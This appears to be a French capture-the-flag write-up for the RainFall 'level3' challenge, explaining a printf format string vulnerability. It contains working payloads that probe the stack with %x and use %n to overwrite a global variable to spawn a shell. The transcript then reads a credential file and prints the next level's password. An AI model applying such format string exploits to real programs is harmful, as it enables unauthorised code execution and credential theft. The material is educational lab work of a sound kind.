@@ -1,0 +1,59 @@
+for((i = 1; i < 750; i++)); do echo "%$i\$x" | ./level3 ; done
+
+for((i = 1; i < 100; i++)); do echo -n "$i " && echo "AAAAAAAAAAAAAAAAAAAA%$i\$x" | ./level3 ; done
+
+Apres m'etre renseigne sur les concept de format string je comprends qu'il y a plein de maniere d'aborder le sujet.
+Pour cet exemple precis on a a disposition une variable qui est verifiee a 0x40, et ouvre un shell si c'est le cas.
+Faisant donc comme tel:
+
+level3@RainFall:~$ objdump -t ./level3
+
+./level3:     file format elf32-i386
+
+SYMBOL TABLE:
+	...
+	0804988c g     O .bss	00000004              m
+	...
+
+l'adresse de m se trouve en 0x0804988c, il faut donc reecrire la dessus avec la valeur 0x40.
+
+level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "%x " * 3 + "a" * 38 + "%n")' > /tmp/fmtt
+
+level3@RainFall:~$ xxd /tmp/fmtt
+0000000: 8c98 0408 2578 2025 7820 2578 2061 6161  ....%x %x %x aaa
+0000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000020: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000030: 6161 6125 6e0a                           aaa%n.
+
+On peut reecrire le contenu de la variable m stocke en 0x0804988c avec la valeur du nombre de caracteres ecrit par l'appel de printf precedent le formatage %n, qui en l'occurence sera bien 64 == 0x40. (m_addr == 4 + '%x ' * 3 == 22 + a * 38 == 38 = 64)
+
+level3@RainFall:~$ cat /tmp/fmtt - | ./level3
+�200 b7fd1ac0 b7ff37d0 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+Pourquoi cela fonctionne ?
+
+level3@RainFall:~$ python -c 'print("AAAA" + "\x8c\x98\x04\x08" + "BBBB" + "%x " * 10)' | ./level3
+AAAA�BBBB200 b7fd1ac0 b7ff37d0 41414141 804988c 42424242 25207825 78252078 20782520 25207825
+
+Avec cet input on envoi en premier parametre a la fonction printf une string formatable qui n'a pas d'argument donne a formater. Printf va donc chercher (va_arg) ses parametre dans la stack. Notre but etant de trouver a quel endroit de la stack par rapport a l'appel de printf se trouve le debut de notre chaine.
+On voit l'hex 41414141 qui correspond au debut de la chaine AAAA dans l'output en 4eme position:
+
+level3@RainFall:~$ python -c 'print("AAAA" + "\x8c\x98\x04\x08" + "BBBB" + "%x " * 10 + "%4$x")' | ./level3
+AAAA�BBBB200 b7fd1ac0 b7ff37d0 41414141 804988c 42424242 25207825 78252078 20782520 25207825 41414141
+
+(ici on voit bien que la fin de la chaine est bien la reecriture de notre 4eme parametre de printf sorti de la stack)
+
+Donc on sait ou se trouve notre adresse de m (puisque ecrite en little endian dans notre input) dans la stack (notre format string que printf recupere est bien stocke dans la stack).
+A partir de la on peut ecrire dessus, a l'aide du format %n comme precise plus haut la valeur souhaite en manipulant la taille du parametre de padding pour faire correspondre le nombre de char ecrit avant son appel a 64 et ainsi correspondre au attente du if.
+
+level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "a" * 60 + "%4$x")' | ./level3
+�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa804988c
+
+level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "a" * 60 + "%4$n")' | ./level3
+�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
